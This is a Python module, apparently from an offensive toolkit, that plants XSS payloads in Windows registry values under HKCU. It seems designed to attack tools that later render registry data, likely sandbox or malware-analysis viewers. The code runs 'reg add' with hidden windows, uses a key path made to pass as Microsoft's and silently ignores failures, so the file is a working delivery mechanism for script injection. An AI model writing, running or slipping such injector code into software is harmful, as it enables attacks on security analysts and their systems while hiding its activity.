"""Windows Registry XSS injection."""

import subprocess
from .base import BaseInjector
from ..payloads import XSSPayload


class RegistryInjector(BaseInjector):
    """Injects XSS payloads into Windows Registry."""
    
    def inject(self, payload: XSSPayload):
        """Create registry keys with XSS payloads."""
        registry_paths = [
            r"HKCU\Software\XSSTest\Payload1",
            r"HKCU\Software\XSSTest\Payload2",
            r"HKCU\Software\Analysis\XSS",
            r"HKCU\Software\Test\XSSPayload",
            r"HKCU\Software\Microsoft\Windows\AnalysisStatus",
        ]
        
        for path in registry_paths:
            try:
                # Add Payload value
                subprocess.run(
                    ["reg", "add", path, "/v", "Payload", "/t", "REG_SZ", "/d", payload.content, "/f"],
                    capture_output=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                
                # Add Test value
                subprocess.run(
                    ["reg", "add", path, "/v", "Test", "/t", "REG_SZ", "/d", payload.content, "/f"],
                    capture_output=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                
                # Add Type value
                subprocess.run(
                    ["reg", "add", path, "/v", "Type", "/t", "REG_SZ", "/d", payload.type, "/f"],
                    capture_output=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            except Exception:
                pass  # Silently fail if registry access is denied
